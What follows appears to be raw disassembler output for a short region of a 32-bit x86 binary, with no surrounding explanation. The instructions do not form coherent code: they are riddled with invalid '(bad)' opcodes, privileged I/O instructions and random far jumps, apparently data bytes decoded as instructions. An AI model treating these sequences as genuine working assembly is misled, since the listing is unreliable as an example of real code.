  414d19:	adc    esp,DWORD PTR [ecx+esi*8+0x3b]
  414d1d:	fisttp QWORD PTR [esi+eax*4+0x27]
  414d21:	or     bh,dh
  414d23:	xchg   edx,eax
  414d24:	and    BYTE PTR [ebp+ebx*4-0x2cc88398],al
  414d2b:	lods   eax,DWORD PTR ds:[esi]
  414d2c:	popa   
  414d2d:	push   cs
  414d2e:	clc    
  414d2f:	mov    cl,bl
  414d31:	ja     0x414dae
  414d33:	test   eax,0x76
	...
  414d94:	add    BYTE PTR [eax],al
  414d96:	mov    bh,0x99
  414d98:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414d9e:	sbb    DWORD PTR [esi+0x646a1445],ebp
  414da4:	(bad)  
  414da5:	stos   DWORD PTR es:[edi],eax
  414da6:	xor    ebx,ecx
  414da8:	add    BYTE PTR [eax],al
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    BYTE PTR [eax-0x55],bh
  414db0:	rcl    BYTE PTR [ebp+esi*1-0x27a0472a],cl
  414db7:	mov    WORD PTR [ebx+0x2c],ds
  414dba:	fwait
  414dbb:	pop    eax
  414dbc:	lock sbb ah,BYTE PTR [edi-0x6e4c50aa]
  414dc3:	ds out dx,eax
  414dc5:	inc    ebp
  414dc6:	dec    ebp
  414dc7:	icebp  
  414dc8:	dec    edx
  414dc9:	mov    ch,0xa0
  414dcb:	(bad)  
  414dcc:	pop    ss
  414dcd:	(bad)
  414dd0:	inc    edx
  414dd1:	test   al,0xed
  414dd3:	lahf   
  414dd4:	lock arpl WORD PTR [ecx],bp
  414dd7:	cdq    
  414dd8:	dec    ecx
  414dd9:	fild   WORD PTR [esi+ebx*4]
  414ddc:	xchg   esp,eax
  414ddd:	push   ebx
  414dde:	mov    edi,0xf4661b5d
  414de3:	push   ebp
  414de4:	mov    edx,0x492466f0
  414de9:	pop    ebp
  414dea:	test   DWORD PTR [eax],0x82130faa
  414df0:	(bad)  
  414df1:	mov    dl,0xe2
  414df3:	lahf   
  414df4:	inc    esp
  414df5:	add    BYTE PTR [edi],ah
  414df7:	jg     0x414df2
  414df9:	xor    DWORD PTR [edi+0xf],ebp
  414dfc:	aad    0xd9
  414dfe:	jae    0x414d9e
  414e00:	push   DWORD PTR [ebp-0x5a]
  414e03:	pusha  
  414e04:	or     al,0xe2
  414e06:	dec    esp
  414e07:	ins    BYTE PTR es:[edi],dx
  414e08:	or     bl,BYTE PTR [ebx-0x5b]
  414e0b:	das    
  414e0c:	dec    esi
  414e0d:	rcl    bh,0x3e
  414e10:	adc    eax,0x3dacee5f
  414e15:	cdq    
  414e16:	jo     0x414e35
  414e18:	clc    
  414e19:	cld    
  414e1a:	test   al,0x21
  414e1c:	mov    edi,0x4d178d0b
  414e21:	fidiv  DWORD PTR [edi+ebx*2+0x13]
  414e25:	fisttp QWORD PTR [ecx]
  414e27:	add    esi,eax
  414e29:	repz test BYTE PTR [ebx+0x37a422],ch
  414e30:	test   al,0x4e
  414e32:	cmc    
  414e33:	fwait
  414e34:	addr16 pop ss
  414e36:	push   ss
  414e37:	mov    bh,0x47
  414e39:	or     ecx,DWORD PTR [esi-0x32337d91]
  414e3f:	mov    ah,0xb0
  414e41:	pushf  
  414e42:	stos   DWORD PTR es:[edi],eax
  414e43:	or     BYTE PTR [eax+0xc],bl
  414e46:	add    cl,0x9b
  414e49:	(bad)  
  414e4a:	clc    
  414e4b:	daa    
  414e4c:	add    ah,BYTE PTR [edi+0x28df3c92]
  414e52:	es lahf 
  414e54:	pop    eax
  414e55:	fisttp DWORD PTR [esi-0x6cce9cd4]
  414e5b:	cs xchg esp,eax
  414e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e5e:	cmp    al,0xaf
  414e60:	xlat   BYTE PTR ds:[ebx]
  414e61:	pop    esp
  414e62:	cmp    DWORD PTR [ebx-0x5fb60c95],eax
  414e68:	sbb    DWORD PTR [ecx-0x38],esi
  414e6b:	sbb    DWORD PTR [ecx-0x58b1188],ebp
  414e71:	adc    dl,ch
  414e73:	sbb    ecx,DWORD PTR ds:0x337d5f37
  414e79:	mov    ebp,0xebd97d11
  414e7e:	and    DWORD PTR [edi+0xc20648d],edi
  414e84:	jge    0x414e47
  414e86:	fcomp  QWORD PTR [ebx-0x64ef1902]
  414e8c:	xor    al,0x78
  414e8e:	lods   al,BYTE PTR ds:[esi]
  414e8f:	mov    dh,0x4e
  414e91:	lods   eax,DWORD PTR ds:[esi]
  414e92:	es sub al,0x9a
  414e95:	push   edi
  414e96:	sar    DWORD PTR ds:0x64c6e73b,1
  414e9c:	mov    ebx,0xe82fe71b
  414ea1:	idiv   edx
  414ea3:	dec    edx
  414ea4:	push   esi
  414ea5:	ds cmc 
  414ea7:	scas   al,BYTE PTR es:[edi]
  414ea8:	fs (bad) 
  414eaa:	lahf   
  414eab:	dec    esi
  414eac:	pop    esp
  414ead:	mov    esi,0xe830a050
  414eb2:	(bad)  
  414eb4:	mov    al,0x0
	...
  414f16:	aaa    
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	dec    esp
  414f23:	cld    
  414f24:	pushf  
  414f25:	push   0x3a
  414f27:	fiadd  DWORD PTR [eax]
  414f29:	add    BYTE PTR [edi],al
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    bl,cl
  414f2f:	shl    DWORD PTR [ebx-0x65471fa9],0x44
  414f36:	iret   
  414f37:	imul   esp,DWORD PTR [edx+edi*4+0x1b367019],0xffffffc9
  414f3f:	(bad)  
  414f40:	add    al,0x16
  414f42:	shl    BYTE PTR [edx],1
  414f44:	in     eax,dx
  414f45:	sbb    ecx,DWORD PTR [edx+0x2c]
  414f48:	das    
  414f49:	sbb    eax,0x16c233b3
  414f4e:	sub    DWORD PTR [esi],esi
  414f50:	loop   0x414fa3
  414f52:	push   cs
  414f53:	inc    esp
  414f54:	jnp    0x414f8e
  414f56:	in     al,dx
  414f57:	mov    ch,0xa3
  414f59:	or     eax,ecx
  414f5b:	mov    edi,0xd4cbc110
  414f60:	mov    ch,0xe0
  414f62:	cmp    bh,BYTE PTR [edx-0x6db4ebd]
  414f68:	mov    esp,0x54d54f93
  414f6d:	inc    edx
  414f6e:	pop    ebx
  414f6f:	call   FWORD PTR [esi+0x694befde]
  414f75:	das    
  414f76:	jno    0x414ef8
  414f78:	pushf  
  414f79:	pop    esp
  414f7a:	inc    edi
  414f7b:	xor    eax,0xb24ed26d
  414f80:	imul   ebx,DWORD PTR [ebp-0x4c80c69b],0x7b
  414f87:	push   ebx
  414f88:	sbb    esi,esi
  414f8a:	inc    eax
  414f8b:	lahf   
  414f8c:	pop    eax
  414f8d:	sti    
  414f8e:	sub    esi,DWORD PTR [edi]
  414f90:	gs js  0x414fb8
  414f93:	les    ecx,FWORD PTR [ecx-0x7176ade0]
  414f99:	fsub   st,st(3)
  414f9b:	add    eax,0x4c449e99
  414fa0:	xchg   ebx,eax
  414fa1:	mov    eax,0xf8110de
  414fa6:	pop    ds
  414fa7:	popa   
  414fa8:	jg     0x415001
  414faa:	push   ds
  414fab:	mov    esp,0x23669174
  414fb0:	lods   eax,DWORD PTR ds:[esi]
  414fb1:	sbb    ebp,ebp
  414fb3:	sub    eax,0xf9914b04
  414fb8:	loope  0x414f8b
  414fba:	jge    0x415033
  414fbc:	pop    eax
  414fbd:	jnp    0x414f5b
  414fbf:	mov    ch,BYTE PTR [eax-0x18]
  414fc2:	in     eax,dx
  414fc3:	pop    ebx
  414fc4:	jb     0x414fb1
  414fc6:	mov    WORD PTR [ecx],fs
  414fc8:	inc    esp
  414fc9:	hlt    
  414fca:	ret    0x369e
  414fcd:	mov    al,0x6c
  414fcf:	in     eax,0x61
  414fd1:	(bad)  
  414fd2:	xor    al,0xf8
  414fd4:	jns    0x414fbf
  414fd6:	and    cl,BYTE PTR [edi+eax*1]
  414fd9:	retf   0xb1b3
  414fdc:	fs xor eax,0x7c6670a2
  414fe2:	pop    edi
  414fe3:	hlt    
  414fe4:	sub    DWORD PTR ds:0xd86eaae6,edx
  414fea:	pop    ecx
  414feb:	pop    esi
  414fec:	and    BYTE PTR [ebx+0x632491c2],0x3f
  414ff3:	xor    ebp,esp
  414ff5:	xchg   ebp,eax
  414ff6:	idiv   esp
  414ff8:	jbe    0x415027
  414ffa:	jnp    0x41507b
  414ffc:	les    edi,FWORD PTR [esi-0x132ec329]
  415002:	sub    DWORD PTR [edi],edx
  415004:	pop    es
  415005:	jge    0x414f94
  415007:	inc    esp
  415008:	mov    esp,0xacd57383
  41500d:	push   0x9ed40f2e
  415012:	or     BYTE PTR [eax+0x65],ah
  415015:	and    BYTE PTR [edi],bh
  415017:	fisubr WORD PTR [edx-0x59]
  41501a:	jbe    0x415042
  41501c:	sub    bl,BYTE PTR [ebp+0x2]
  41501f:	arpl   WORD PTR [esi+0x77c81b4b],sp
  415025:	test   BYTE PTR [esi],0xfa
  415028:	or     ah,BYTE PTR [ecx+ebx*4-0x31]
  41502c:	arpl   WORD PTR [edx],ax
  41502e:	inc    edx
  41502f:	push   es
  415030:	sub    DWORD PTR [edi+0x1d],ebx
  415033:	jp     0x41508d
	...
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0x34509bd1
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR [edx],bl
  4150af:	les    ebp,FWORD PTR [edi]
  4150b1:	cmp    al,0x95
  4150b3:	and    eax,0xf5e5ff46
  4150b8:	jno    0x41506b
  4150ba:	jne    0x4150cd
  4150bc:	xchg   edi,eax
  4150bd:	xchg   ebx,eax
  4150be:	les    ebx,FWORD PTR [edi]
  4150c0:	or     eax,0xf1db29a2
  4150c5:	sbb    DWORD PTR [edi],ecx
  4150c7:	sub    eax,0x14774e61
  4150cc:	inc    esp
  4150cd:	lods   al,BYTE PTR ds:[esi]
  4150ce:	nop
  4150cf:	icebp  
  4150d0:	js     0x415053
  4150d2:	mov    bl,BYTE PTR [ecx]
  4150d4:	cwde   
  4150d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d6:	sub    eax,0x7d0beb7d
  4150db:	mov    al,0xc7
  4150dd:	ret    0x2c10
  4150e0:	jge    0x4150a1
  4150e2:	cli    
  4150e3:	mov    esp,ds
  4150e5:	inc    ecx
  4150e6:	add    dh,BYTE PTR [edi]
  4150e8:	dec    edx
  4150e9:	pop    es
  4150ea:	rcl    DWORD PTR [edx-0x52a3bebe],0x1f
  4150f1:	int3   
  4150f2:	int3   
  4150f3:	outs   dx,BYTE PTR ds:[esi]
  4150f4:	and    BYTE PTR [edx-0x66],bl
  4150f7:	test   al,0x7d
  4150f9:	mov    edi,0x1afd5692
  4150fe:	pop    ss
  4150ff:	pop    DWORD PTR [edx+edi*4]
  415102:	lds    esi,FWORD PTR [edx+0x4c]
  415105:	inc    esi
  415106:	ins    DWORD PTR es:[edi],dx
  415107:	push   esi
  415108:	push   edi
  415109:	test   BYTE PTR [ecx],bl
  41510b:	es adc eax,0xd5832342
  415111:	das    
  415112:	push   cs
  415113:	inc    esi
  415114:	pop    es
  415115:	jle    0x4150e5
  415117:	lea    edi,[edi-0x317ba757]
  41511d:	hlt    
  41511e:	pop    esi
  41511f:	mov    bl,0x2b
  415121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415122:	adc    al,0x97
  415124:	int    0xe8
  415126:	repnz sti 
  415128:	arpl   WORD PTR [esi],di
  41512a:	stos   DWORD PTR es:[edi],eax
  41512b:	gs ss call 0x8116:0x71af39ad
  415134:	repz (bad) 
  415138:	clc    
  415139:	pop    ebx
  41513a:	arpl   cx,si
  41513c:	(bad)  
  41513d:	mov    cl,0xc9
  41513f:	jbe    0x4151b1
  415141:	jno    0x415163
  415143:	and    ebp,DWORD PTR [edi-0x4c]
  415146:	adc    al,0xa2
  415148:	sbb    ah,BYTE PTR [edi-0xb21dc]
  41514e:	shr    DWORD PTR [esp+ebp*8],1
  415151:	stc    
  415152:	jns    0x415102
  415154:	xor    esi,DWORD PTR [ecx+0x456847ae]
  41515a:	out    dx,al
  41515b:	(bad)  
  41515c:	sbb    ebp,DWORD PTR [ebx+edi*4+0x5b]
  415160:	fisubr DWORD PTR [eax]
  415162:	cld    
  415163:	inc    edx
  415164:	ins    DWORD PTR es:[edi],dx
  415165:	and    BYTE PTR [ebp+0x7e],ch
  415168:	dec    ebp
  415169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41516a:	inc    esp
  41516b:	fs data16 jns 0x415177
  41516f:	punpcklbw mm2,mm1
  415172:	cli    
  415173:	cmp    edi,eax
  415175:	cli    
  415176:	test   al,0xe3
  415178:	imul   edx,ebx,0xfffffffa
  41517b:	jnp    0x4151e4
  41517d:	mov    edx,0x60dd54ed
  415182:	cwde   
  415183:	jmp    0xd704:0x54be37a7
  41518a:	mov    dl,0xa3
  41518c:	push   ss
  41518d:	add    edi,DWORD PTR [edx]
  41518f:	push   edi
  415190:	les    ebp,FWORD PTR [esi]
  415192:	outs   dx,DWORD PTR fs:[esi]
  415194:	arpl   di,sp
  415196:	add    bh,BYTE PTR [edi+ecx*2-0xf]
  41519a:	inc    edi
  41519b:	push   esp
  41519c:	mov    eax,ds:0xf97998a0
  4151a1:	scas   eax,DWORD PTR es:[edi]
  4151a2:	jp     0x4151b8
  4151a4:	dec    esp
  4151a5:	cdq    
  4151a6:	cmc    
  4151a7:	(bad)  
  4151a8:	dec    esi
  4151aa:	(bad)  
  4151ab:	jge    0x41515d
  4151ad:	ret    
  4151ae:	into   
  4151af:	call   FWORD PTR [edx-0x3a]
  4151b2:	xor    al,BYTE PTR [edi+edi*4+0x0]
	...
  415215:	add    BYTE PTR [edi+edx*4],ch
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x1b
  415223:	dec    eax
  415224:	mov    bl,0xbe
  415226:	dec    eax
  415227:	fadd   QWORD PTR [eax]
  415229:	add    BYTE PTR [edi],al
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    BYTE PTR [edi+edi*4+0x217699d2],dl
  415234:	dec    edx
  415235:	gs mov edi,0x57c61ccb
  41523b:	xchg   BYTE PTR [edx-0x61],al
  41523e:	les    ebx,FWORD PTR [eax]
  415240:	push   ebx
  415241:	stc    
  415242:	or     al,0x2e
  415244:	push   ecx
  415245:	(bad)  
  415246:	je     0x41522d
  415248:	fild   QWORD PTR [ecx+0x1bed82a2]
  41524e:	(bad)  
  41524f:	imul   edx,DWORD PTR [edx+edx*1],0xca7727ff
  415256:	into   
  415257:	gs mov dl,0x97
  41525a:	sbb    eax,0xefe5f923
  41525f:	in     al,0x34
  415261:	fldenv [eax-0x17]
  415264:	fidivr DWORD PTR [edx-0x6bad9a8b]
  41526a:	mov    esp,0xe8264429
  41526f:	push   ebp
  415270:	mov    WORD PTR [edx+ecx*8-0x3a3d1077],ds
  415277:	popf   
  415278:	int3   
  415279:	jge    0x415243
  41527b:	rcr    eax,1
  41527d:	xchg   edi,eax
  41527e:	xor    DWORD PTR [ebx-0x53104b0f],esp
  415284:	xchg   BYTE PTR [ebx-0x43638fd3],dl
  41528a:	push   ds
  41528b:	cs (bad) 
  41528d:	pop    esp
  41528e:	ret    
  41528f:	cdq    
  415290:	idiv   BYTE PTR [edx]
  415292:	in     eax,dx
  415293:	icebp  
  415294:	inc    ebx
  415295:	inc    ebp
  415296:	icebp  
  415297:	outs   dx,DWORD PTR ds:[esi]
  415298:	mov    al,fs:0x17bf2feb
  41529e:	pop    ebp
  41529f:	(bad)  
  4152a0:	jmp    0x415303
  4152a2:	or     ch,BYTE PTR [ebp-0x71d6078]
  4152a8:	mov    ds:0x9748cc70,eax
  4152ad:	ds popa 
  4152af:	pop    ebx
  4152b0:	jmp    0xfbdc:0xf65b5a5d
  4152b7:	inc    ebx
  4152b8:	mov    cl,0xe8
  4152ba:	add    ecx,edx
  4152bc:	(bad)  
  4152be:	xchg   esi,eax
  4152bf:	jge    0x415265
  4152c1:	fcom   st(4)
  4152c3:	pop    ecx
  4152c4:	sbb    DWORD PTR cs:[ebp-0x53],ebx
  4152c8:	imul   esp,DWORD PTR [edi+0x7f],0x1c836365
  4152cf:	mov    ds:0xbf11b3a,al
  4152d4:	cmp    cl,BYTE PTR [ebp+0x22cba231]
  4152da:	adc    eax,0x9a0d8bed
  4152df:	mov    esp,0xf89b525d
  4152e4:	jno    0x415349
  4152e6:	xchg   ecx,eax
  4152e7:	repz adc al,0x2c
  4152ea:	jne    0x41532e
  4152ec:	mov    eax,ds:0x7b30c111
  4152f1:	sub    al,0x22
  4152f3:	and    eax,0xd28eb0b3
  4152f8:	sub    al,0xea
  4152fa:	pop    eax
  4152fb:	sbb    al,0xbb
  4152fd:	cmp    al,0xa
  4152ff:	mov    esi,0x39a10db0
  415304:	inc    ebx
  415305:	jns    0x4152a0
  415307:	jbe    0x415290
  415309:	adc    BYTE PTR [edx],cl
  41530b:	std    
  41530c:	inc    eax
  41530d:	mov    ds:0xe8c8c8f2,al
  415312:	popa   
  415313:	or     bl,BYTE PTR [edx-0x7792b5ea]
  415319:	lods   eax,DWORD PTR ds:[esi]
  41531a:	pop    ebx
  41531b:	cmp    DWORD PTR [esi-0x4a1c4807],ebp
  415321:	push   ss
  415322:	or     cl,BYTE PTR ds:0x6eefa869
  415328:	(bad)  
  415329:	dec    ebx
  41532a:	sub    BYTE PTR [edi+0xf],cl
  41532d:	jno    0x4152f1
  41532f:	nop
  415330:	jo     0x4153ac
  415332:	cmc    
  415333:	std    
  415334:	fild   DWORD PTR [eax]
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0xa24b9b2a
  4153a3:	mov    eax,ds:0xdd4facb0
  4153a8:	add    BYTE PTR [eax],al
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [ecx-0x71],bh
  4153b0:	cli    
  4153b1:	out    dx,eax
  4153b2:	imul   ebx,DWORD PTR [esi-0x22],0x885733d3
  4153b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153ba:	ror    DWORD PTR [edx],1
  4153bc:	mov    ah,0xb0
  4153be:	adc    eax,0xb5b0442f
  4153c3:	jns    0x4153d0
  4153c5:	mov    ecx,0x6e8d30cc
  4153ca:	js     0x415397
  4153cc:	cmp    ax,WORD PTR [eax+ecx*4+0x3a]
  4153d1:	push   ds
  4153d2:	rcl    esp,cl
  4153d4:	xchg   esp,eax
  4153d5:	pop    ebp
  4153d6:	test   eax,ebx
  4153d8:	pop    esp
  4153d9:	jno    0x415386
  4153db:	mov    BYTE PTR [ebp-0x55],bh
  4153de:	test   al,0x27
  4153e0:	paddsw mm6,QWORD PTR [ebx]
  4153e3:	add    ebp,DWORD PTR [esi+0x1]
  4153e6:	das    
  4153e7:	lods   al,BYTE PTR ds:[esi]
  4153e8:	dec    ebx
  4153e9:	mov    al,0xcc
  4153eb:	scas   eax,DWORD PTR es:[edi]
  4153ec:	pop    esi
  4153ed:	xor    esi,DWORD PTR [ecx-0x32]
  4153f0:	shr    DWORD PTR [ebx],0xaf
  4153f3:	icebp  
  4153f4:	xchg   ecx,eax
  4153f5:	mov    ds:0xb2aa28ea,eax
  4153fa:	hlt    
  4153fb:	inc    ecx
  4153fc:	daa    
  4153fd:	and    bh,ah
  4153ff:	jbe    0x41546b
  415401:	lods   eax,DWORD PTR ds:[esi]
  415402:	or     al,0x14
  415404:	popf   
  415405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415406:	inc    esi
  415407:	xchg   ecx,eax
  415408:	sub    eax,0xb8b3e04
  41540d:	xor    dl,BYTE PTR [edx+eax*2]
  415410:	lods   eax,DWORD PTR ds:[esi]
  415411:	pusha  
  415412:	outs   dx,DWORD PTR ds:[esi]
  415413:	out    dx,eax
  415414:	inc    edx
  415415:	dec    esp
  415416:	adc    eax,ebx
  415418:	lds    edi,FWORD PTR [ecx+0x6c1d4397]
  41541e:	(bad)  
  41541f:	out    0x29,eax
  415421:	inc    ebx
  415422:	repz fld DWORD PTR [edi]
  415425:	jb     0x4153bf
  415427:	jo     0x415433
  415429:	jno    0x41544b
  41542b:	cwde   
  41542c:	dec    eax
  41542d:	fwait
  41542e:	jae    0x41547f
  415430:	dec    edi
  415431:	push   ebx
  415432:	add    dh,bl
  415434:	dec    ebx
  415435:	push   edi
  415436:	nop
  415437:	call   0x9066:0xf03db426
  41543e:	data16 in al,0x42
  415441:	(bad)  
  415442:	test   al,0x8b
  415444:	int    0x62
  415446:	cmp    bl,BYTE PTR [ecx+0x4f]
  415449:	mov    edx,0x4244eeaf
  41544e:	mov    bl,dl
  415450:	std    
  415451:	in     al,dx
  415452:	xor    di,WORD PTR [esi]
  415455:	dec    eax
  415456:	mov    edx,0x7210f270
  41545b:	jae    0x4154d7
  41545d:	dec    esp
  41545e:	inc    ecx
  41545f:	push   edi
  415460:	jmp    0xa478f2e5
  415465:	cwde   
  415466:	lahf   
  415467:	jo     0x415431
  415469:	and    eax,0x907ac649
  41546e:	in     al,0x1b
  415470:	push   ebx
  415471:	scas   eax,DWORD PTR es:[edi]
  415472:	inc    ebp
  415473:	fisttp DWORD PTR cs:[ecx]
  415476:	xchg   ebp,eax
  415477:	mov    edx,0x7630730f
  41547c:	hlt    
  41547d:	sub    al,0x6a
  41547f:	sti    
  415480:	in     al,dx
  415481:	sub    DWORD PTR [ebx+0x250cbd7c],edi
  415487:	inc    ecx
  415488:	pushf  
  415489:	xchg   edx,eax
  41548a:	inc    edx
  41548b:	pushf  
  41548c:	sbb    bh,BYTE PTR [ebx]
  41548e:	mov    al,0xe1
  415490:	(bad)  
  415491:	mov    ds:0xa753bc42,eax
  415496:	pop    ecx
  415497:	mov    al,0x55
  415499:	out    0xb,al
  41549b:	aad    0x7b
  41549d:	push   esp
  41549e:	idiv   bl
  4154a0:	mov    ah,0xf1
  4154a2:	std    
  4154a3:	bound  esp,QWORD PTR [edx]
  4154a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a6:	cmp    dh,BYTE PTR ds:0x1235a091
  4154ac:	mov    bh,0xa1
  4154ae:	add    ebp,DWORD PTR [ecx-0x3315749f]
  4154b4:	and    al,0x0
	...
  415516:	in     al,0xf0
  415518:	sub    DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	push   edi
  415523:	outs   dx,DWORD PTR ds:[esi]
  415524:	clc    
  415525:	cld    
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [ebx-0x4b260cb8],ch
  415533:	ret    
  415534:	or     al,0x93
  415536:	loop   0x41553e
  415538:	in     eax,dx
  415539:	adc    eax,ecx
  41553b:	push   bx
  41553d:	sbb    bh,BYTE PTR [ebp-0x30f25ec9]
  415543:	in     al,0xa9
  415545:	stos   BYTE PTR es:[edi],al
  415546:	nop
  415547:	xor    esp,DWORD PTR [esi-0x12]
  41554a:	pusha  
  41554b:	imul   edx,DWORD PTR [edx-0x69ff2651],0xffffffcc
  415552:	call   0xb185:0xea7e0949
  415559:	xchg   edi,eax
  41555a:	mov    ax,0x5d9b
  41555e:	ja     0x415599
  415560:	cdq    
  415561:	inc    ebp
  415562:	sbb    BYTE PTR [eax],0x15
  415565:	jb     0x4155cf
  415567:	dec    edi
  415568:	adc    al,0x7f
  41556a:	xor    DWORD PTR [ebp+0x505fbd82],esp
  415570:	rol    bh,cl
  415572:	lds    ebx,FWORD PTR [eax+0x767b7532]
  415578:	dec    esp
  415579:	dec    esp
  41557a:	mov    eax,0xc090e7ba
  41557f:	dec    esp
  415580:	add    al,0xd0
  415582:	nop
  415583:	push   ecx
  415584:	xchg   DWORD PTR [esp+esi*1],ecx
  415587:	pop    esp
  415588:	outs   dx,DWORD PTR ds:[esi]
  415589:	pusha  
  41558a:	jecxz  0x415581
  41558c:	adc    eax,DWORD PTR [ecx+0x5945db72]
  415592:	mov    al,ds:0x687a990a
  415597:	or     DWORD PTR [ebx],esi
  415599:	pop    ecx
  41559a:	mov    edi,0x67366e03
  41559f:	add    BYTE PTR [ebx+0x7e],ah
  4155a2:	sbb    ecx,DWORD PTR [edi-0x7408f497]
  4155a8:	pusha  
  4155a9:	enter  0x280a,0x87
  4155ad:	sbb    BYTE PTR [eax+ecx*1-0x73],0x96
  4155b2:	jp     0x415576
  4155b4:	mov    ecx,DWORD PTR [ebx]
  4155b6:	hlt    
  4155b7:	xor    eax,0x5766387b
  4155bc:	fwait
  4155bd:	lods   eax,DWORD PTR ds:[esi]
  4155be:	dec    esp
  4155bf:	xchg   esp,eax
  4155c0:	add    eax,0x1ed190b9
  4155c5:	(bad)  
  4155c6:	outs   dx,BYTE PTR ds:[esi]
  4155c7:	outs   dx,BYTE PTR ds:[esi]
  4155c8:	rcr    BYTE PTR [esi-0x12],1
  4155cb:	push   0x3f
  4155cd:	dec    edx
  4155ce:	pop    ebp
  4155cf:	cli    
  4155d0:	sub    eax,0xda3c5abd
  4155d5:	in     al,dx
  4155d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155d7:	imul   edi,DWORD PTR [edx-0xd],0xfd801274
  4155de:	push   eax
  4155df:	adc    bl,BYTE PTR [edi+0x3f2bde35]
  4155e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e6:	daa    
  4155e7:	ss cwde 
  4155e9:	out    dx,al
  4155ea:	jb     0x415576
  4155ec:	call   0x3b7a7394
  4155f1:	imul   edx,DWORD PTR [ecx-0x113cae81],0xb52cdab5
  4155fb:	retf   0x2c76
  4155fe:	inc    ebx
  4155ff:	jae    0x415618
  415601:	pop    esi
  415602:	dec    ebx
  415603:	sbb    DWORD PTR [edx],ebx
  415605:	lahf   
  415606:	sub    dh,BYTE PTR [edi+ecx*4-0x5e83a2ba]
  41560d:	push   ss
  41560e:	jnp    0x415686
  415610:	hlt    
  415611:	jb     0x415659
  415613:	imul   ecx,DWORD PTR [eax-0x6e],0x7a
  415617:	and    BYTE PTR [ecx+ebp*1-0x1ceae87e],dh
  41561e:	loop   0x4155d5
  415620:	icebp  
  415621:	pop    ds
  415622:	gs dec ecx
  415624:	xlat   BYTE PTR ds:[ebx]
  415625:	in     eax,dx
  415626:	dec    ecx
  415627:	aaa    
  415628:	mov    BYTE PTR [edx-0x17],ah
  41562b:	outs   dx,DWORD PTR ds:[esi]
  41562c:	das    
  41562d:	inc    esp
  41562e:	jnp    0x41562e
  415630:	mov    ds:0x786caa95,eax
	...
  415695:	add    BYTE PTR [ebp-0x66],ch
  415698:	mov    esp,0xfd67ff45
  41569d:	mov    edx,0xaffd40cb
  4156a2:	scas   eax,DWORD PTR es:[edi]
  4156a3:	stos   BYTE PTR es:[edi],al
  4156a4:	jbe    0x4156f9
  4156a6:	pop    ebp
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [ebp-0x7e587aab],bh
  4156b3:	jmp    0xd77b:0x96793dcf
  4156ba:	outs   dx,BYTE PTR ds:[esi]
  4156bb:	fndisi(8087 only) 
  4156bd:	repz inc esp
  4156bf:	iret   
  4156c0:	test   eax,0xd34bafdd
  4156c5:	dec    eax
  4156c6:	lods   al,BYTE PTR ds:[esi]
  4156c7:	fs mov ebx,0xed9213ba
  4156cd:	xor    BYTE PTR [ecx-0x57b8c0d7],cl
  4156d3:	in     al,dx
  4156d4:	jnp    0x41567d
  4156d6:	stc    
  4156d7:	mov    ch,0xbb
  4156d9:	imul   edi,DWORD PTR [esi-0x52],0xffffff90
  4156dd:	cmp    eax,0x5d8f12a4
  4156e2:	(bad)  
  4156e3:	or     al,0x54
  4156e5:	jb     0x4156e2
  4156e7:	cmp    eax,0x91743615
  4156ec:	retf   0x644b
  4156ef:	jmp    0x4156da
  4156f1:	inc    ebx
  4156f2:	inc    ebp
  4156f3:	sbb    eax,0x78388210
  4156f8:	mov    edx,0x988bf288
  4156fd:	sahf   
  4156fe:	enter  0x1b4,0x53
  415702:	push   0xc9408817
  415707:	inc    edx
  415708:	push   DWORD PTR [ebx-0x2aae9cc7]
  41570e:	xor    ecx,DWORD PTR [edx-0x7842f088]
  415714:	or     DWORD PTR [ecx+0x2bdfe1a9],ebx
  41571a:	xchg   ecx,eax
  41571b:	iret   
  41571c:	push   esp
  41571d:	jae    0x41569f
  41571f:	sub    al,0xd0
  415721:	inc    edi
  415722:	pop    esi
  415723:	adc    eax,0xd4f32720
  415728:	jno    0x41577f
  41572a:	xor    eax,DWORD PTR [edi]
  41572c:	es (bad) 
  41572e:	out    0x97,eax
  415730:	mov    edi,esi
  415732:	inc    ebx
  415733:	mov    cl,0x4a
  415735:	test   DWORD PTR [esi+0x2e],ebp
  415738:	int3   
  415739:	int    0xf
  41573b:	outs   dx,DWORD PTR ds:[esi]
  41573c:	mov    cl,0xda
  41573e:	cli    
  41573f:	fmul   DWORD PTR [edi-0x2b42de56]
  415745:	inc    ebp
